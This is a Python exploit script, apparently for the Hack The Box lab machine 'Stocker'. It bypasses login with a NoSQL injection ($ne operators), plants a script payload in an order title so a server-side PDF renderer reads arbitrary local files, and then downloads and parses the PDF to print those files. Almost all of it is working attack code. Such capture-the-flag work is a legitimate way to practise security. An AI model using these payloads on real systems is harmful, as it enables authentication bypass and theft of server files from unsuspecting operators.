#!/usr/bin/env python3

import requests
import json
import sys
import random
import string
import os
from PyPDF2 import PdfReader

url  = ""
file = ""

def help():
    if len(sys.argv) < 2:
        print("Usage: ./lfi.py <file_to_read>\n[!]")
        exit()
    else:
        global url
        url = "http://dev.stocker.htb"
        global file
        file = sys.argv[1]
    
    return url, file

def get_cookie(url): 
    body = '{"username":{"$ne":""},"password":{"$ne":""}}'
    length = str(len(body))
    headers = { "Content-Type":"application/json","Content-Length":length } # gotta set this, since the injection needs to happen in json format
    r = requests.post(url + "/login", headers=headers, data=body, allow_redirects=False)
    cookie = r.headers['Set-Cookie'].split(";")[0]
    return cookie

def send_payload(url,cookie, file):
    # tried for quite a few hours, but for the life of me, I couldn't find a working solution to return the full base64(responseText) and exfil it that way so it preserves the line breaks and what not
    # it only returns a piece of the base64 string; apparently browsers impose a limit on the response length that can be retrieved and this limit is typically enforced to prevent blocking the browser for an extended period (according to chatgpt lol)
    body = '''{"basket":[
        {
            "_id":"638f116eeb060210cbd83a93",
            "title":"<script>xhr=new XMLHttpRequest();xhr.open('GET','file://%s');xhr.onload = function(){if (xhr.status === 200) { document.write(xhr.responseText)}};xhr.send();</script>",
            "description":"It\'s toilet paper.",
            "image":"",
            "price":0.69,
            "currentStock":4212,
            "__v":0,
            "amount":1
        }
    ]}''' %file
    length = str(len(body))
    headers = { "Content-Type":"application/json","Content-Length":length,"Cookie":cookie }
    r = requests.post(url + "/api/order", headers=headers, data=body, allow_redirects=False)
    resp = json.loads(r.text)
    if resp['success'] == True:
        orderId = resp['orderId']

    return orderId

def lfi(url, file, cookie, orderId):
    headers = { "Cookie":cookie }
    r = requests.get(url + "/api/po/" + orderId, headers=headers, allow_redirects=False)
    temp_file = "/tmp/" + "".join(random.choice(string.ascii_lowercase) for i in range(11))
    with open(temp_file, "wb") as pdf_obj:
        pdf_obj.write(r.content)
    return temp_file

def reader(temp_file):
    with open(temp_file, "rb") as pdf_obj:
        reader = PdfReader(pdf_obj)
        page_count = len(reader.pages)
        for i in range(page_count):
            page = reader.pages[i]
            text = page.extract_text()
        if "Stockers - Purchase Order" in text: # if you get back the template, I decided to clear the text variable because it gets annoying pretty quick to get it back everytime when a file doesn't exist
            text = ""
        if len(text) == 0:
            print("[!] The file doesn't exist or you don't have permission to read it.")
        else:
            print("\n" + text + "\n")

def main():
    help()
    cookie = get_cookie(url)
    orderId = send_payload(url,cookie, file)
    temp_file = lfi(url, file, cookie, orderId)
    reader(temp_file)
    print("[*] Cleaning up...")
    os.system("rm " + temp_file)

if __name__=="__main__":
    main()
